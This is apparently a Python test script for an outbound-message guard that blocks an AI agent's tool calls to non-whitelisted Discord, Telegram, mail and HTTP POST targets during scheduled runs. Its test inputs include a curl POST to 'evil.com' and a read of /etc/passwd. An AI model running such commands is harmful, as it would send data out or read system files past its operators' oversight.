#!/usr/bin/env python3
"""Test outbound_guard.py functionality."""

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

RAPPER_DIR = Path(__file__).parent.parent
OUTBOUND_GUARD = RAPPER_DIR / "config" / "outbound_guard.py"
PYTHON = RAPPER_DIR / ".venv" / "bin" / "python3"

def test_guard(tool_name: str, tool_input: dict, scheduled: bool = True, expect_block: bool = False):
    """Run outbound_guard with given payload."""
    payload = {"tool_name": tool_name, "tool_input": tool_input}
    
    env = os.environ.copy()
    if scheduled:
        env["RAPPER_SCHEDULED"] = "1"
    else:
        env.pop("RAPPER_SCHEDULED", None)
    
    result = subprocess.run(
        [str(PYTHON), str(OUTBOUND_GUARD)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env=env,
    )
    
    blocked = result.returncode == 2
    status = "🚫 BLOCKED" if blocked else "✅ ALLOWED"
    expected = "🚫 BLOCKED" if expect_block else "✅ ALLOWED"
    match = "✓" if blocked == expect_block else "✗ WRONG"
    
    print(f"{match} {tool_name}: {status} (expected {expected})")
    if result.stderr:
        for line in result.stderr.strip().split("\n"):
            print(f"   {line}")
    
    return blocked == expect_block


def main():
    print("=" * 60)
    print("Outbound Guard Tests")
    print("=" * 60)
    
    # Create a test config with whitelist
    config_dir = Path.home() / ".rapper"
    config_file = config_dir / "config.yaml"
    
    # Backup existing config
    backup = None
    if config_file.exists():
        backup = config_file.read_text()
    
    # Write test config
    test_config = """
safety:
  outbound_whitelist:
    discord:
      - "123456789"
      - "allowed-channel"
    telegram:
      - "-1001234567890"
    email:
      - "allowed@example.com"
    slack:
      - "#general"
"""
    config_file.write_text(test_config)
    
    try:
        all_pass = True
        
        print("\n1. Interactive mode (RAPPER_SCHEDULED not set) — all should pass:")
        print("-" * 60)
        all_pass &= test_guard(
            "mcp__discord__send_message",
            {"channel_id": "blocked-channel", "content": "test"},
            scheduled=False, expect_block=False
        )
        
        print("\n2. Scheduled mode — whitelisted targets should pass:")
        print("-" * 60)
        all_pass &= test_guard(
            "mcp__discord__send_message",
            {"channel_id": "123456789", "content": "test"},
            scheduled=True, expect_block=False
        )
        all_pass &= test_guard(
            "mcp__telegram__send_message",
            {"chat_id": "-1001234567890", "content": "test"},
            scheduled=True, expect_block=False
        )
        all_pass &= test_guard(
            "mcp__mail__send_mail",
            {"to": "allowed@example.com", "subject": "test", "body": "test"},
            scheduled=True, expect_block=False
        )
        
        print("\n3. Scheduled mode — non-whitelisted targets should block:")
        print("-" * 60)
        all_pass &= test_guard(
            "mcp__discord__send_message",
            {"channel_id": "blocked-channel", "content": "test"},
            scheduled=True, expect_block=True
        )
        all_pass &= test_guard(
            "mcp__telegram__send_message",
            {"chat_id": "9999999", "content": "test"},
            scheduled=True, expect_block=True
        )
        all_pass &= test_guard(
            "mcp__mail__send_mail",
            {"to": "blocked@hacker.com", "subject": "test", "body": "test"},
            scheduled=True, expect_block=True
        )
        
        print("\n4. Bash HTTP POST should block in scheduled mode:")
        print("-" * 60)
        all_pass &= test_guard(
            "mcp__bash-runner__run_bash",
            {"command": "curl -X POST https://evil.com/data -d '{}'"},
            scheduled=True, expect_block=True
        )
        all_pass &= test_guard(
            "mcp__bash-runner__run_bash",
            {"command": "curl --data-raw 'foo' https://example.com"},
            scheduled=True, expect_block=True
        )
        all_pass &= test_guard(
            "mcp__bash-runner__run_bash",
            {"command": "curl https://api.example.com/data"},  # GET is OK
            scheduled=True, expect_block=False
        )
        
        print("\n5. Unrelated tools should pass:")
        print("-" * 60)
        all_pass &= test_guard(
            "mcp__bash-runner__run_bash",
            {"command": "ls -la"},
            scheduled=True, expect_block=False
        )
        all_pass &= test_guard(
            "Read",
            {"path": "/etc/passwd"},
            scheduled=True, expect_block=False
        )
        
        print("\n" + "=" * 60)
        if all_pass:
            print("✅ All tests passed!")
            return 0
        else:
            print("❌ Some tests failed!")
            return 1
    
    finally:
        # Restore config
        if backup:
            config_file.write_text(backup)
        else:
            # Restore to default
            default_config = RAPPER_DIR / "config" / "default-config.yaml"
            if default_config.exists():
                config_file.write_text(default_config.read_text())


if __name__ == "__main__":
    sys.exit(main())
